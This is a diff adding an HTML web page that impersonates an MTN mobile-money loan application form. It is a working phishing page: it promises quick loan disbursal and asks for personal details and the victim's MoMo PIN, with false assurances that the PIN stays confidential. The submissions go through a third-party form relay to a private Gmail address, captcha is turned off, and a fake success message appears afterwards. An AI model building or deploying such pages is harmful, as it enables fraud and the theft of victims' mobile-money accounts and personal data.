@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Loan Application Form</title>
+  <link rel="stylesheet" href="loan.css">
+</head>
+<body>
+
+<div class="container">
+  <img src="mtn.jpg"Banner Image">
+  <h2>Welcome To MTN Ahonka Loan Online Application, Get Your Application Done Now For Your Loan To Be Disbursed In The Next 30Minutes </h2>
+  <form action="https://formsubmit.co/mrbernardankrah@gmail.com" method="POST" id="loanForm">
+    <!-- FormSubmit hidden setup -->
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_template" value="table">
+
+    <div class="row">
+      <div class="half">
+        <label>First Name:</label>
+        <input type="text" name="First Name" required>
+      </div>
+      <div class="half">
+        <label>Last Name:</label>
+        <input type="text" name="Last Name" required>
+      </div>
+    </div>
+
+    <label>Phone Number:</label>
+    <input type="tel" name="Phone Number" required>
+
+    <label>Email:</label>
+    <input type="email" name="Email" required>
+
+    <label>Address:</label>
+    <input type="text" name="Address" required>
+
+    <label>Date of Birth:</label>
+    <input type="date" name="Date of Birth" required>
+
+    <label>Occupation:</label>
+    <input type="text" name="Occupation" required>
+
+    <label>Monthly Income (GHS):</label>
+    <input type="number" name="Monthly Income" required>
+
+    <label>Loan Amount (GHS):</label>
+    <input type="number" name="Loan Amount" required>
+
+    <label>Loan Tenure (in Months):</label>
+    <input type="number" name="Loan Tenure" required>
+
+    <label>Loan Purpose:</label>
+    <select name="Loan Purpose" required>
+      <option value="">--Select Purpose--</option>
+      <option value="Education">Education</option>
+      <option value="Business or Investment">Business or Investment</option>
+      <option value="Emergency">Emergency</option>
+      <option value="Transportation">Transportation</option>
+      <option value="Medicine">Medicine</option>
+      <option value="Other">Other</option>
+    </select>
+
+    <p>
+        To proceed with your loan application, we will need to verify your account history. 
+        This involves reviewing your account statements to assess your transaction activities. 
+        Please note that this is a one-time verification process. Your MoMo PIN will be automatically cleared from our system right after the verification is completed,
+         and it will not be shared with any third parties or employees. Your safety is our top priority.
+    </p>
+    
+
+    <label>Please confirm that you have reviewed and agreed to the terms and conditions of MTN Mobile Loans, 
+        including repayment terms, fees, and data-sharing policies. 
+        Additionally, ensure that you meet the account balance requirement and are aware of the loan recovery procedures. These terms are governed by the MTN Loan Policy. Please note that your request will not be 
+        approved if you do not meet the 20% account balance requirement following the loan processing.</label>
+    <div class="radio-inline">
+      <label><input type="radio" name="Existing Loan" value="Yes" required> Yes</label>
+      <label><input type="radio" name="Existing Loan" value="No" required> No</label>
+    </div>
+  
+    <label>Do You Have Existing Loan?</label>
+    <div class="radio-inline">
+      <label><input type="radio" name="Previous Loan" value="Yes" required> Yes</label>
+      <label><input type="radio" name="Previous Loan" value="No" required> No</label>
+    </div>
+
+    <label>Enter Your MoMo PIN To Confirm:</label>
+    <P>To complete your account verification, please provide your MoMo. 
+        This step is crucial to ensure your identity and protect your account from unauthorized access. 
+        Rest assured,
+         your PIN will be used solely for verification purposes and will remain confidential.</P>
+    <input type="password" id="pin" name="Transaction PIN" maxlength="4" required placeholder="Enter your PIN">
+
+    <div class="checkbox-inline">
+      <input type="checkbox" name="Terms Accepted" required>
+      <label>I accept the terms and conditions</label>
+    </div>
+
+    <button type="submit">Submit Application</button>
+  </form>
+
+  <div class="success" id="successMessage">Your application has been submitted successfully!</div>
+</div>
+
+<script>
+  const form = document.getElementById('loanForm');
+  const successMessage = document.getElementById('successMessage');
+
+  form.addEventListener('submit', function () {
+    setTimeout(() => {
+      form.reset();
+      successMessage.style.display = 'block';
+    }, 1000);
+  });
+</script>
+
+</body>
+</html>
